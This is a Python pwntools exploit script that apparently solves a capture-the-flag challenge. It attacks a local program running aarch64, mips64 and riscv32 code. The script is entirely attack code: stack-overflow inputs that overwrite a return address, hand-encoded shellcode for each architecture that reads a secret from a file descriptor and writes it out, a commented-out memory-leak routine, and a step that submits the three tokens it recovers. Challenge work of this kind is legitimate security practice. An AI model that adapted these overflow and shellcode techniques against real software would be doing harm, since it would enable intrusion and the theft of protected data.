#!/usr/bin/env python

from pwn import *
from ast import literal_eval

archs = ["aarch64", "mips64", "riscv32"]

p = process(["python3", "chall.py"])

def send(line):
    p.sendline(line)


def recv():
    x = []
    for a in archs:
        p.recvuntil(a.encode() + b": ")
        x.append(literal_eval(p.recvline().strip().decode()))
    print(x)
    return x


def sr(line):
    send(line)
    return recv()


recv()

# leaks = [b"", b"", b""]
# for i in range(0x10):
#     sr(b"1")
#     x = sr(b"A" * (0x20 + i))
#     for j in range(len(leaks)):
#         a = x[j][0x26:-1] + b"\0"
#         a = bytes([a[i]])
#         print(a)
#         leaks[j] += a
# for a, l in zip(archs, leaks):
#     print()
#     print(a)
#     print(hexdump(l))
# exit()

context.arch = "aarch64"
# 88: 52800540     	mov	w0, #0x2a
# 8c: 910003e1     	mov	x1, sp
# 90: 528007e8     	mov	w8, #0x3f
# 94: 52800202     	mov	w2, #0x10
# 98: d4000001     	svc	#0
# 9c: 52800808     	mov	w8, #0x40
# a0: 52800020     	mov	w0, #0x1
# a4: 52800202     	mov	w2, #0x10
# a8: d4000001     	svc	#0
# ac: d4200020     	brk	#0x1
sc = (
    p32(0x52800540)
    + p32(0x910003E1)
    + p32(0x528007E8)
    + p32(0x52800202)
    + p32(0xD4000001)
    + p32(0x52800808)
    + p32(0x52800020)
    + p32(0x52800202)
    + p32(0xD4000001)
    + p32(0xD4200020)
)
assert b"\n" not in sc
sr(str(1 + (1 << 32)).encode())
sr(b"1")
sr(p64(1))
sr(b"xx")
sr(b"1" + b"A" * 0x27 + p64(0x5500002124 - len(sc)))
tok1 = sr(b"2   " + sc + b" " * 3)[0]
success("tok1: %s", tok1)

context.arch = "mips64"
context.endian = "big"
# 10c: 00 00 a5 67  	daddiu	$5, $sp, 0x0 <ld-temp.o>
# 110: 2a 00 04 64  	daddiu	$4, $zero, 0x2a <ld-temp.o+0x2a>
# 114: 10 00 06 64  	daddiu	$6, $zero, 0x10 <ld-temp.o+0x10>
# 118: 88 13 02 64  	daddiu	$2, $zero, 0x1388 <__bss_start+0xf78>
# 11c: 0c 00 00 00  	syscall <ld-temp.o>
# 120: 01 00 04 64  	daddiu	$4, $zero, 0x1 <ld-temp.o+0x1>
# 124: 10 00 06 64  	daddiu	$6, $zero, 0x10 <ld-temp.o+0x10>
# 128: 89 13 02 64  	daddiu	$2, $zero, 0x1389 <__bss_start+0xf79>
# 12c: 0c 00 00 00  	syscall <ld-temp.o>
# 130: 0d 00 00 00  	break <ld-temp.o>
sc = (
    p32(0x0000A567, endian="little")
    + p32(0x2A000464, endian="little")
    + p32(0x10000664, endian="little")
    + p32(0x88130264, endian="little")
    + p32(0x0C000000, endian="little")
    + p32(0x01000464, endian="little")
    + p32(0x10000664, endian="little")
    + p32(0x89130264, endian="little")
    + p32(0x0C000000, endian="little")
    + p32(0x0D000000, endian="little")
)
assert b"\n" not in sc
sr(str(1 + (1 << 32)).encode())
sr(b"1")
sr(b"1" + b"A" * 0x6F + p64(0x4000000000 + 0x3358 - len(sc)))
tok2 = sr(b"2 " + sc + b" " * 1)[1]
success("tok2: %s", tok2)

context.arch = "riscv32"
context.endian = "little"
context.bits = 32
# 5e: 41 11        	<unknown>
# 60: 93 08 f0 03  	li	a7, 63
# 64: 8a 85        	<unknown>
# 66: 41 46        	<unknown>
# 68: 13 05 a0 02  	li	a0, 42
# 6c: 73 00 00 00  	ecall
# 70: 93 08 00 04  	li	a7, 64
# 74: 41 46        	<unknown>
# 76: 05 45        	<unknown>
# 78: 73 00 00 00  	ecall
# 7c: 00 00        	<unknown>
sc = unhex("9308f0038a8541461305a0027300000093080004414605457300000000000000")
assert b"\n" not in sc
sr(b"1")
sr(b"A" * 0x3c + p32(0x40000000 + 0x1b24 - len(sc)))
tok3 = sr(b"2 " + sc + b" " * 3)[2]
success("tok3: %s", tok3)

p.sendline(b"magic word")
p.sendline(tok1)
p.sendline(tok2)
p.sendline(tok3)

x = p.recvrepeat(1).strip().decode()
print(x)